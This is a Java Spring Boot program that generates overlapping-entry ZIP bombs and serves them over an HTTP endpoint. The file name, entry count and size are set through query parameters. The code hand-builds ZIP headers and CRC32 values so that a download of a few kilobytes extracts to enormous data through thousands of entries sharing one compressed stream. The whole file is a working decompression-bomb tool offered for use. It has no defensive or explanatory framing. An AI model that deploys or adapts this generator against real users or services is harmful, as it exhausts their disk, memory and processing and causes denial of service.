package zipbomb;
import java.util.List;
import java.util.ArrayList;
import java.util.stream.LongStream;
import java.util.stream.Collectors;
import java.io.ByteArrayOutputStream;
import org.springframework.http.MediaType;
import org.springframework.http.HttpStatus;
import org.springframework.http.HttpHeaders;
import org.springframework.http.ResponseEntity;
import org.springframework.http.ContentDisposition;
import org.springframework.boot.SpringApplication;
import org.springframework.core.io.ByteArrayResource;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.boot.autoconfigure.SpringBootApplication;
@SpringBootApplication
@RestController
public class Zipbomb {
    public static void main(String[] args) {
    	SpringApplication.run(Zipbomb.class, args);
    }
	private static long f(List<Long> x, long y) {
		long output = 0;
		for (short i = 32; i --> 0;) output ^= x.get(i) * (y >> i & 1);
		return output;
	}
	private static String U(long x) {
		return new StringBuilder().append((char) (x & 255)).append((char) (x >> 8 & 255)).toString();
	}
	private static String Y(long x) {
		return U(x) + new StringBuilder().append((char) (x >> 16 & 255)).append((char) (x >> 24 & 255)).toString();
	}
	private static byte[] zipbomb(int file_num, int size) {
		ByteArrayOutputStream output = new ByteArrayOutputStream();
		long A = (1L << 32) - 1;
		List<Long> D = LongStream.iterate(1, i -> i << 1).limit(32).boxed().collect(Collectors.toList()), G = new ArrayList<Long>(D.subList(0, 24)), E = new ArrayList<Long>();
		G.add(0L);
		Integer i;
		int F = size * 1032 + 1;
		for (i = 0; i < 8; i++) {
			E.add(0L);
			for (short j = 0; j < 8; j++) E.set(i, E.get(i) >> 1 ^ 3988292384L * ((1 << i >> j ^ E.get(i)) & 1));
			G.add(i, E.get(i));
		}
		do {
			List<Long> d = new ArrayList<Long>(D), g = new ArrayList<Long>(G);
			if ((F & 1) > 0) for (i = 32; i --> 0;) D.set(i, f(d, G.get(i)));
			for (i = 32; i --> 0;) G.set(i, f(g, G.get(i)));
		} while ((F >>= 1) > 0);
		long I = ~f(D, 2 * A + 1) & A;
		String V = Y(I) + Y(size + 14) + Y(size * 1032 + 1);
		output.write(("PK\u0003\u0004\u0014\0\0\0\u0008\0\0\0\0\0" + V + "\u0001\0\0\u00000\u00ed\u00c0").getBytes(), 0, 33);
		output.write(0x81);
		output.write("\u0008\0\0\0\u00c0\u00b0\u00fbS_d\u000b".getBytes(), 0, 11);
		for (i = size; i --> 1;) output.write(0);
		output.write(0x60);
		int K = output.size();
		for (i = 0; i < file_num;) {
			String num = (++i).toString();
			output.write(("PK\u0001\u0002\u0014\0\u0014\0\0\0\u0008\0\0\0\0\0" + V + U(num.length()) + "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0" + num).getBytes(), 0, 46 + num.length());
		}
		output.write(("PK\u0005\u0006\0\0\0\0" + U(file_num) + U(file_num) + Y(output.size() - K) + Y(K) + "\0\0").getBytes(), 0, 22);
		return output.toByteArray();
	}
    @GetMapping("/")
    public ResponseEntity<ByteArrayResource> index(@RequestParam(value = "name", defaultValue = "output.zip") String name, @RequestParam(value = "file_num", defaultValue = "1000") String file_num, @RequestParam(value = "size", defaultValue = "1000") String size) {
		HttpHeaders headers = new HttpHeaders();
		headers.setContentType(new MediaType("application", "zip"));
		headers.setContentDisposition(ContentDisposition.attachment().filename(name).build());
		return new ResponseEntity<ByteArrayResource>(new ByteArrayResource(zipbomb(Integer.parseInt(file_num), Integer.parseInt(size))), headers, HttpStatus.OK); // might break if illegal
    }
}
